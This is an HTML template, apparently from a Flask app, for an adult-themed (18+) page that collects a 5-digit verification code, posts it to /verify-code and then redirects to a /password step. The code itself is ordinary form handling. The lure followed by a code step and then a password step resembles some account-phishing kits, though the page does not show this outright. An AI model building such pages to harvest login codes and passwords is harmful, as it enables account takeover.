<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title data-i18n="enter_code">Enter verification code</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
</head>
<body>
    <div class="auth-container">
        <div class="glass">
            <div class="emoji-18plus">üîû</div>

            <h1 class="auth-title" data-i18n="enter_code">Enter verification code</h1>
            
            <p class="auth-subtitle" data-i18n="code_placeholder">Enter 5-digit code</p>

            <form id="codeForm">
                <div class="input-group">
                    <input 
                        type="text" 
                        class="input-field" 
                        id="code" 
                        placeholder="12345"
                        maxlength="6"
                        pattern="[0-9]*"
                        data-i18n="code_placeholder"
                        required
                    >
                </div>

                <button type="submit" class="btn btn-primary" data-i18n="verify_code">
                    Verify code
                </button>
            </form>

            <a href="/" class="back-link" data-i18n="back">‚Üê Back</a>

            <div id="errorMessage" class="error-message" style="display: none;"></div>
        </div>
    </div>

    <script src="{{ url_for('static', filename='i18n.js') }}"></script>
    <script>
        document.getElementById('codeForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const code = document.getElementById('code').value;
            
            if (!code || code.length < 5) {
                alert(window.i18n?.t('invalid_code') || 'Enter correct code');
                return;
            }

            try {
                const response = await fetch('/verify-code', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ code: code })
                });

                if (response.ok) {
                    window.location.href = '/password';
                } else {
                    const error = await response.json();
                    document.getElementById('errorMessage').textContent = error.error || 'Invalid code';
                    document.getElementById('errorMessage').style.display = 'block';
                }
            } catch (error) {
                console.error('Error:', error);
                document.getElementById('errorMessage').textContent = 'Server error';
                document.getElementById('errorMessage').style.display = 'block';
            }
        });

        document.getElementById('code').addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '');
        });
    </script>
</body>
</html>
